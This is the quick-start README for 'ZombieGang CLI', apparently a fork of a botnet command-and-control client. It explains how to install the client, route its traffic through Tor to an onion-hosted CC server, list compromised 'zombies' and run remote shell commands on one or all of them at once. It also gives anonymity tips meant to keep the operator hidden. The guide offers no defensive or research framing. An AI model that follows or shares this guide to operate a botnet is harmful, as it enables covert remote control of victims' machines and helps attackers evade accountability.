# ZombieGang CLI - Quick Start Guide

## Installation (Ubuntu)

### 1. Quick Install Script
```bash
# Update system
sudo apt-get update && sudo apt-get upgrade -y

# Install dependencies
sudo apt-get install -y python3 python3-pip mariadb-server tor

# Install Python packages
cd zombiegang/master-client
pip3 install -r requirements.txt
```

### 2. Configure Telegram (Optional)
```bash
export TELEGRAM_BOT_TOKEN='your-bot-token'
export TELEGRAM_CHAT_ID='your-chat-id'
```

### 3. Start Tor (Optional)
```bash
sudo systemctl start tor
```

### 4. Run CLI
```bash
python3 cli.py
```

## Quick Commands

### Setup
```
set USER myusername
set PSWD           # Will prompt securely
set RHOST localhost:8080
login
```

### With Tor
```
set PXHOST 127.0.0.1
set PXPORT 9050
proxy              # Enable Tor proxy
set RHOST your-onion-address.onion
login
```

### Manage Zombies
```
get zombies                    # List all zombies
get zombies id username ip     # Show specific fields
```

### Remote Shell
```
start 1            # Start session with zombie ID 1
whoami             # Execute command
ls -la             # Execute command
stop 1             # Stop session
```

### Multiple Sessions
```
set SESSION all    # Target all active sessions
ps aux             # Runs on all zombies
```

### Help
```
help               # Show all commands
help start         # Show help for specific command
```

## Features

✅ **CLI-Only** - No web interface bloat
✅ **Telegram Notifications** - Real-time updates
✅ **Tor v3 Support** - Anonymous .onion addresses
✅ **Ubuntu Optimized** - Designed for VPS deployment
✅ **Multi-Session** - Control multiple zombies simultaneously
✅ **Bug Fixed** - Improved error handling

## File Structure
```
master-client/
├── cli.py                          # Main CLI application
├── config.py                       # Configuration
├── requirements.txt                # Python dependencies
├── app/
│   ├── components/
│   │   ├── telegram_notifier.py   # Telegram integration
│   │   ├── proxy.py                # Tor/SOCKS proxy (v3 support)
│   │   └── ...
│   └── ...
```

## Environment Variables
- `TELEGRAM_BOT_TOKEN` - Your Telegram bot token
- `TELEGRAM_CHAT_ID` - Your Telegram chat ID
- `TOR_SOCKS_HOST` - Tor proxy host (default: 127.0.0.1)
- `TOR_SOCKS_PORT` - Tor proxy port (default: 9050)

## Security Tips
1. Always use Tor for anonymity
2. Use strong passwords
3. Keep Telegram bot token secret
4. Run CC server as hidden service
5. Regular database backups

## Troubleshooting

**Can't connect to CC server**
- Check if server is running: `netstat -tlnp | grep 8080`
- Verify RHOST is correct
- Check proxy settings if using Tor

**Telegram not working**
- Verify bot token: `echo $TELEGRAM_BOT_TOKEN`
- Check chat ID: `echo $TELEGRAM_CHAT_ID`
- Test bot on Telegram first

**Tor connection fails**
- Check Tor is running: `systemctl status tor`
- Verify SOCKS port: `netstat -tlnp | grep 9050`

## What's New in v1.0.0

- ✨ Removed Flask web dependencies (CLI-only)
- ✨ Added Telegram bot integration
- ✨ Added Tor v3 hidden service support (socks5h://)
- ✨ Fixed bare except clauses with proper exception handling
- ✨ Fixed json.load() bug (changed to json.loads())
- ✨ Added comprehensive error logging
- ✨ Ubuntu VPS optimizations
- ✨ Updated to modern Python dependencies

## Links
- Full Setup Guide: [CLI_SETUP_UBUNTU.md](CLI_SETUP_UBUNTU.md)
- Original Project: https://github.com/r3nt0n/zombiegang
- This Fork: https://github.com/bitbybit91/zombiegang
